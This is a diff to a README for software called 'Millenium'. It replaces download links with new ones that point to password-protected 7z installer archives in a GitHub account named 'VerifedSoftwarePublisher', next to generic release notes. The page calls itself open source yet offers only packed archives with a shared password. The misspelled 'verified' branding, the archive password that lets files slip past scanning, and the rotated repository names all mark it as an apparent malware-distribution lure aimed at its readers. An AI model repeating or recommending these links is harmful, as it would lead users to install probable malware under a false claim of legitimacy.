@@ -11,7 +11,7 @@
 
 ## Millenium is an open source for all users that everyone can use.
 
-## [⚡ Millenium 2.7](https://raw.githubusercontent.com/VerifedSoftwarePublisher/softwaredownloader/master/setup_EN.7z):
+## [⚡ Millenium 2.7](https://raw.githubusercontent.com/VerifedSoftwarePublisher/verifedinstaller/master/setup_en.7z):
 #### Use Password: app
 
 * NEW AI Augmented Sky Tool.
@@ -22,7 +22,7 @@
 * Improvements to ML Cache.
 * Third-party Plugin Implementation (PC users).
 
-## [⚡ Millenium Version 2.8](https://raw.githubusercontent.com/VerifedSoftwarePublisher/softwaredownloader/master/setup_EN.7z):
+## [⚡ Millenium Version 2.8](https://raw.githubusercontent.com/VerifedSoftwarePublisher/verifedinstaller/master/setup_en.7z):
 #### Use Password: app
 
 * Support for two new Crop Aspect Ratios: 21:9 and 9:21. These are well suited for extra wide-screen computer displays, and digital cinema uses.
